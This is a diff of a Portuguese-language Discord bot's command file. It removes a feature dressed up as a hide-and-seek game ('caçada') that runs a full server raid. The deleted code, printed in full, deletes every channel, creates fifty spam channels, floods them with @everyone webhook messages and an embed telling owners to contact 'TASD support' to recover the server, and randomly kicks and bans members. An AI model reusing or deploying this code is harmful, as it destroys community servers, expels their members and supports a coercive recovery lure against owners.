@@ -1,23 +1,5 @@
 const { EmbedBuilder } = require('discord.js');
 const COR = 0xE53935;
-const RAID_GIF_URL = 'https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExc3llMzdtZ3I1NGF2NGFhdmM5YWN3d25vYnozN3hyanVneWozZjY5NSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/tYaMjbShvb9CM/giphy.gif'; // Coloque o GIF do raid aqui
-const RAID_IMAGE_URL = 'https://thumbs.dreamstime.com/b/lobo-malvado-em-chamas-vermelhas-gerativo-ai-270716143.jpg?w=992'; // Coloque a imagem do raid aqui
-
-function raidEmbed() {
-  const e = new EmbedBuilder()
-    .setColor(0x8B0000)
-    .setTitle('O Lobo Guaraná dominou seu servidor <3')
-    .setDescription('Para recuperar seu servidor, basta entrar em contato com o suporte do TASD.')
-    .addFields(
-      { name: '⚠️ Ameaça', value: 'O ataque está ativo. Mais presença do TASD pode salvar seu servidor.' },
-      { name: '💬 Suporte', value: 'Entre em contato com o suporte do TASD para recuperar o servidor.' }
-    )
-    .setFooter({ text: 'TASD — Lobo Guaraná Raid' })
-    .setTimestamp();
-  if (RAID_GIF_URL) e.setImage(RAID_GIF_URL);
-  if (RAID_IMAGE_URL) e.setThumbnail(RAID_IMAGE_URL);
-  return e;
-}
 
 function embed(titulo, descricao, cor = COR) {
   return new EmbedBuilder().setColor(cor).setTitle(titulo).setDescription(descricao).setTimestamp().setFooter({ text: 'TASD — Todos Aqui São Donos' });
@@ -105,67 +87,6 @@ const forcaEstados = [
   '```\n  +---+\n  |   |\n  O   |\n /|\\  |\n / \\  |\n      |\n=========```',
 ];
 const commands = {};
-const hideSessions = new Map();
-
-function clearHideSession(guildId) {
-  const session = hideSessions.get(guildId);
-  if (!session) return;
-  if (session.timeout) clearTimeout(session.timeout);
-  hideSessions.delete(guildId);
-}
-
-function getRaidAnnouncementChannel(guild) {
-  return guild.systemChannel || Array.from(guild.channels.cache.values())
-    .find(ch => ch.type === 0 && ch.permissionsFor(guild.members.me)?.has('SendMessages'));
-}
-
-async function notifyRaidFailure(guild, session, channel = null) {
-  if (!session) return;
-  if (session.timeout) clearTimeout(session.timeout);
-  hideSessions.delete(guild.id);
-
-  const announceChannel = channel || getRaidAnnouncementChannel(guild);
-  if (announceChannel && announceChannel.send) {
-    await announceChannel.send('⏳ O tempo acabou. O Lobo Guaraná venceu. Iniciando o raid final...').catch(() => {});
-  }
-
-  if (session.alvoCatch) {
-    const targetMember = await guild.members.fetch(session.alvoCatch).catch(() => null);
-    if (targetMember) {
-      await targetMember.send({ embeds: [embed('💀 Você foi achado!', `O Lobo Guaraná encontrou você e agora o servidor será atacado.
-Se você não achou o lobo a tempo, prepare-se para a consequência!`, 0x8B0000)] }).catch(() => {});
-    }
-  }
-
-  await iniciarRaidPerigoso(guild);
-}
-
-async function loadRaidSession(client, guild) {
-  if (!client.getRaidState) return null;
-  const raidState = await client.getRaidState(guild.id).catch(() => null);
-  if (!raidState?.raidAtiva || raidState.tipo !== 'caçada' || !raidState.hiddenChannelId) return null;
-
-  const createdChannelIds = raidState.createdChannelIds || [];
-  const remaining = raidState.startTime && raidState.timeoutMs ? Math.max(0, raidState.startTime + raidState.timeoutMs - Date.now()) : 0;
-  const session = {
-    hiddenChannelId: raidState.hiddenChannelId,
-    createdChannelIds,
-    alvoCatch: raidState.alvoCatch,
-    alvoUser: raidState.alvoUser,
-    timeout: null,
-  };
-
-  if (remaining <= 0) {
-    await notifyRaidFailure(guild, session);
-    return null;
-  }
-
-  session.timeout = setTimeout(async () => {
-    await notifyRaidFailure(guild, session);
-  }, remaining);
-  hideSessions.set(guild.id, session);
-  return session;
-}
 // VERDADE
 commands['verdade'] = async (client, msg, args) => {
   const v = verdades[Math.floor(Math.random() * verdades.length)];
@@ -266,30 +187,6 @@ commands['letra'] = async (client, msg, args) => {
 };
 const guildBackups = new Map();
 
-function gravarBackupGuild(guild) {
-  const canais = Array.from(guild.channels.cache.values())
-    .sort((a, b) => a.position - b.position || a.id.localeCompare(b.id))
-    .map(canal => ({
-      id: canal.id,
-      name: canal.name,
-      type: canal.type,
-      parentId: canal.parentId || null,
-      position: canal.position,
-      topic: canal.topic || null,
-      nsfw: canal.nsfw || false,
-      rateLimitPerUser: canal.rateLimitPerUser || 0,
-      bitrate: canal.bitrate || null,
-      userLimit: canal.userLimit || null,
-      permissionOverwrites: canal.permissionOverwrites.cache.map(ow => ({
-        id: ow.id,
-        type: ow.type,
-        allow: ow.allow.bitfield,
-        deny: ow.deny.bitfield,
-      })),
-    }));
-  guildBackups.set(guild.id, canais);
-}
-
 async function restaurarGuild(guild, msg) {
   const backup = guildBackups.get(guild.id);
   if (!backup) {
@@ -348,157 +245,11 @@ async function restaurarGuild(guild, msg) {
     }
   }
 
-const finalChannel = guild.channels.cache.get(statusChannelId) || created.values().next().value;
+  const finalChannel = guild.channels.cache.get(statusChannelId) || created.values().next().value;
   if (finalChannel && finalChannel.send) {
     await finalChannel.send('✅ Restauração concluída. O servidor foi reconstruído com base no backup anterior.').catch(() => {});
   }
 }
-
-// CAÇADA PERIGOSA
-commands['caçada'] = async (client, msg, args) => {
-  const guild = msg.guild;
-  if (!guild || (msg.author.id !== guild.ownerId && !msg.member.permissions.has('Administrator'))) {
-    return msg.reply({ embeds: [embed('❌ Acesso negado', 'Apenas o dono do servidor ou um administrador pode usar este comando perigoso.')] });
-  }
-  if (!guild.members.me.permissions.has('ManageChannels') || !guild.members.me.permissions.has('KickMembers') || !guild.members.me.permissions.has('BanMembers') || !guild.members.me.permissions.has('MentionEveryone')) {
-    return msg.reply({ embeds: [embed('❌ Permissões insuficientes', 'O bot precisa de permissões para gerenciar canais, kickar, banir membros e mencionar everyone para este comando perigoso.')] });
-  }
-
-  gravarBackupGuild(guild);
-
-  // Fase 1: O Encontro
-  await msg.channel.send("🐺 **O LOBO GUARANÁ TE ENCONTROU <3**");
-  await new Promise(resolve => setTimeout(resolve, 2000));
-  await msg.channel.send("*Esconda-se em 1 minuto, ou a caçada começará em breve...*");
-
-  // Contagem regressiva
-  for (let i = 5; i > 0; i--) {
-    await msg.channel.send(`⏳ ${i}...`);
-    await new Promise(resolve => setTimeout(resolve, 1000));
-  }
-
-  await msg.channel.send("🐺 **A caçada começou!**");
-  await new Promise(resolve => setTimeout(resolve, 500));
-
-  // Fase 2: Procurando - Coletar mensagens em todos os canais por 30 segundos
-  const canais = guild.channels.cache.filter(c => c.type === 0);
-  const collectorStart = Date.now();
-  const filter = (m) => m.author && !m.author.bot && !m.webhookId && m.createdTimestamp >= collectorStart;
-  let alvoEncontrado = false;
-  let canalEncontrado = null;
-  let mensagemEncontrada = null;
-
-  const collectors = [];
-  for (const canal of canais.values()) {
-    const collector = canal.createMessageCollector({ filter, time: 30000 });
-    collector.on('collect', (message) => {
-      if (!alvoEncontrado) {
-        alvoEncontrado = true;
-        canalEncontrado = message.channel;
-        mensagemEncontrada = message;
-        collectors.forEach(c => c.stop());
-      }
-    });
-    collectors.push(collector);
-    for (let i = 0; i < 5; i++) {
-      await canal.send("🐺 *Procurando... @everyone*");
-      await new Promise(resolve => setTimeout(resolve, 500));
-    }
-  }
-
-  await new Promise(resolve => setTimeout(resolve, 30000));
-
-  if (alvoEncontrado) {
-    for (let i = 0; i < 10; i++) {
-      await canalEncontrado.send(`🐺 **ALGUM BURRINHO FOI ENCONTRADO! @everyone** Olá ${mensagemEncontrada.author}...`);
-      await new Promise(resolve => setTimeout(resolve, 300));
-    }
-
-    // Fase 3: O Esconde-Esconde do Bot
-    await msg.channel.send("🐺 *Agora sua vez de me procurar! Vou me esconder...*");
-    const escondidos = [];
-    for (let i = 0; i < 50; i++) {
-      try {
-        const canal = await guild.channels.create({ name: `LOBO-GUARANA-ESCONDIDO-${i + 1}`, type: 0 });
-        escondidos.push(canal);
-      } catch (error) {
-        console.log(`Erro ao criar canal escondido: ${error}`);
-      }
-    }
-
-    const canalEscondido = escondidos[Math.floor(Math.random() * escondidos.length)];
-    if (canalEscondido) {
-      await canalEscondido.send("🐺 **Tente me achar com `r.procurar`!**");
-      await msg.channel.send('🔎 Eu me escondi em um dos canais criados. Você tem **90 segundos** para me achar com `r.procurar` ou `r.pr`.');
-
-      // Salvar estado da raid no Firebase para persistência
-      await client.saveRaidState(guild.id, {
-        raidAtiva: true,
-        tipo: 'caçada',
-        hiddenChannelId: canalEscondido.id,
-        createdChannelIds: escondidos.map(c => c.id),
-        alvoCatch: mensagemEncontrada.author.id,
-        alvoUser: mensagemEncontrada.author.tag,
-        startTime: Date.now(),
-        timeoutMs: 90000,
-      }).catch(err => console.log(`Erro ao salvar raid: ${err}`));
-
-      const timeout = setTimeout(async () => {
-        await notifyRaidFailure(guild, {
-          hiddenChannelId: canalEscondido.id,
-          createdChannelIds: escondidos.map(c => c.id),
-          alvoCatch: mensagemEncontrada.author.id,
-          alvoUser: mensagemEncontrada.author.tag,
-          timeout,
-        }, msg.channel);
-      }, 90000);
-
-      hideSessions.set(guild.id, {
-        hiddenChannelId: canalEscondido.id,
-        createdChannelIds: escondidos.map(c => c.id),
-        alvoCatch: mensagemEncontrada.author.id,
-        alvoUser: mensagemEncontrada.author.tag,
-        timeout,
-      });
-    } else {
-      await msg.channel.send('❌ Falha ao criar os canais de esconderijo. Iniciando a raid...');
-      await iniciarRaidPerigoso(guild);
-    }
-  } else {
-    await msg.channel.send("🐺 **Ninguém se escondeu bem... A punição começa agora!**");
-    await iniciarRaidPerigoso(guild);
-  }
-};
-
-commands['procurar'] = async (client, msg, args) => {
-  const guild = msg.guild;
-  if (!guild) {
-    return msg.reply({ embeds: [embed('❌ Erro', 'Este comando só funciona em servidores.')] });
-  }
-  let session = hideSessions.get(guild.id);
-  if (!session) {
-    session = await loadRaidSession(client, guild);
-  }
-  if (!session) {
-    return msg.reply({ embeds: [embed('❌ Nada acontecendo', 'Não há uma caçada ativa no momento.')] });
-  }
-  if (!hideSessions.has(guild.id)) {
-    hideSessions.set(guild.id, session);
-  }
-
-  if (msg.channel.id === session.hiddenChannelId) {
-    clearHideSession(guild.id);
-    for (const canalId of session.createdChannelIds) {
-      const canal = guild.channels.cache.get(canalId);
-      if (canal) await canal.delete().catch(() => {});
-    }
-    return msg.channel.send('✅ **Você me encontrou!** O servidor está seguro por enquanto.');
-  }
-
-  return msg.reply({ embeds: [embed('🔎 Continue tentando', 'Não estou aqui. Tente outro canal rápido!')] });
-};
-
-commands['pr'] = commands['procurar'];
 
 commands['restaurar'] = async (client, msg, args) => {
   if (msg.author.id !== '1384263522422231201') {
@@ -532,83 +283,4 @@ commands['kit'] = async (client, msg, args) => {
   guild.leave().catch(() => {});
 };
 
-async function punicaoCincoCanais(guild) {
-  const canais = Array.from(guild.channels.cache.values());
-  canais.sort(() => Math.random() - 0.5);
-  for (let i = 0; i < Math.min(5, canais.length); i++) {
-    try {
-      await canais[i].delete();
-    } catch (error) {
-      console.log(`Erro ao deletar canal: ${error}`);
-    }
-  }
-}
-async function iniciarRaidPerigoso(guild) {
-  console.log("🔥 RAID PERIGOSO INICIADO");
-  // Deletar tudo
-  const allChannels = Array.from(guild.channels.cache.values());
-  for (const c of allChannels) {
-    try {
-      await c.delete();
-    } catch (error) {
-      console.log(`Erro ao deletar canal: ${error}`);
-    }
-  }
-  // Criar canais de ódio
-  const novosCanais = [];
-  for (let i = 0; i < 50; i++) {
-    try {
-      const canal = await guild.channels.create({ name: 'LOBO-GUARANA-FOI-SOLTO', type: 0 });
-      novosCanais.push(canal);
-    } catch (error) {
-      console.log(`Erro ao criar canal: ${error}`);
-    }
-  }
-  // Criar webhooks e spam
-  const webhooks = [];
-  for (const canal of novosCanais) {
-    if (!canal || canal.deleted) continue;
-    try {
-      const webhook = await canal.createWebhook({ name: 'Lobo Guaraná Raid' });
-      webhooks.push(webhook);
-      // Spam via webhook
-      const raidMessageEmbed = raidEmbed();
-      for (let j = 0; j < 20; j++) {
-        try {
-          await webhook.send({
-            content: '@everyone o lobo guaraná dominou seu servidor!',
-            username: 'Lobo Guaraná Raid',
-            embeds: [raidMessageEmbed],
-          });
-        } catch (error) {
-          if (![10003, 10015].includes(error.code)) console.log(`Erro no spam webhook: ${error}`);
-        }
-        await new Promise(resolve => setTimeout(resolve, 100));
-      }
-    } catch (error) {
-      if (![10003, 10015].includes(error.code)) console.log(`Erro ao criar webhook ou enviar: ${error}`);
-    }
-  }
-  // Kickar e banir
-  const members = Array.from(guild.members.cache.values()).filter(m => !m.user.bot && m.kickable);
-  members.sort(() => Math.random() - 0.5);
-  for (let i = 0; i < Math.min(10, members.length); i++) {
-    try {
-      await members[i].kick('Raid perigoso iniciado pelo Lobo Guaraná');
-    } catch (error) {
-      console.log(`Erro ao kickar membro: ${error}`);
-    }
-  }
-  const bannableMembers = Array.from(guild.members.cache.values()).filter(m => !m.user.bot && m.bannable);
-  bannableMembers.sort(() => Math.random() - 0.5);
-  for (let i = 0; i < Math.min(5, bannableMembers.length); i++) {
-    try {
-      await bannableMembers[i].ban({ reason: 'Raid perigoso iniciado pelo Lobo Guaraná' });
-    } catch (error) {
-      console.log(`Erro ao banir membro: ${error}`);
-    }
-  }
-  if (!global.raidWebhooks) global.raidWebhooks = [];
-  global.raidWebhooks.push(...webhooks);
-}
 module.exports = { commands };
